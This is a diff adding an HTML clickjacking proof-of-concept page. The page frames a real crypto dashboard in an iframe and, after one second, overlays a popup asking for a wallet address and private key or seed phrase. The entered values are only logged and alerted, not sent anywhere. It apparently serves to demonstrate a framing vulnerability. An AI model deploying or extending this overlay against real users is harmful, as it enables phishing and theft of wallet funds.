@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Clickjack Test Page</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            overflow: hidden;
+        }
+        #popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            padding: 20px;
+            background-color: white;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+        }
+        #popup button {
+            display: block;
+            margin: 20px auto 0;
+        }
+        #overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 999;
+        }
+        #iframe-container {
+            width: 100%;
+            height: 100%;
+        }
+        iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+        .input-container {
+            margin-bottom: 10px;
+        }
+        .input-container label {
+            display: block;
+            margin-bottom: 5px;
+        }
+        .input-container input {
+            width: calc(100% - 20px);
+            padding: 5px 10px;
+            font-size: 14px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+    </style>
+</head>
+<body>
+    <div id="overlay"></div>
+    <div id="popup">
+        <p>Clickjacking test!</p>
+        <div class="input-container">
+            <label for="walletAddress">Wallet Address:</label>
+            <input type="text" id="walletAddress" placeholder="Enter wallet address">
+        </div>
+        <div class="input-container">
+            <label for="privateKey">Private Key/Seed Phrase:</label>
+            <input type="text" id="privateKey" placeholder="Enter private key or seed phrase">
+        </div>
+        <button onclick="submitInputs()">Submit</button>
+        <button onclick="connectMetaMask()">Connect MetaMask</button>
+        <button onclick="closePopup()">Close</button>
+    </div>
+    <div id="iframe-container">
+        <iframe src="https://dashboard.mor.org/#/mainnet/capital"></iframe>
+    </div>
+    <script>
+        async function connectMetaMask() {
+            if (typeof window.ethereum !== 'undefined') {
+                try {
+                    // Request account access if needed
+                    const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+                    // Access the user's account address
+                    console.log('Connected account:', accounts[0]);
+                    alert('Connected account: ' + accounts[0]);
+                } catch (error) {
+                    console.error('User rejected the request:', error);
+                }
+            } else {
+                alert('MetaMask is not installed. Please install MetaMask and try again.');
+            }
+        }
+
+        function showPopup() {
+            document.getElementById('popup').style.display = 'block';
+            document.getElementById('overlay').style.display = 'block';
+        }
+
+        function closePopup() {
+            document.getElementById('popup').style.display = 'none';
+            document.getElementById('overlay').style.display = 'none';
+        }
+
+        function submitInputs() {
+            const walletAddress = document.getElementById('walletAddress').value;
+            const privateKey = document.getElementById('privateKey').value;
+            console.log('Wallet Address:', walletAddress);
+            console.log('Private Key/Seed Phrase:', privateKey);
+            alert('Wallet Address: ' + walletAddress + '\nPrivate Key/Seed Phrase: ' + privateKey);
+        }
+
+        window.onload = function() {
+            setTimeout(showPopup, 1000); // Show the popup after 1 second
+        }
+    </script>
+</body>
+</html>
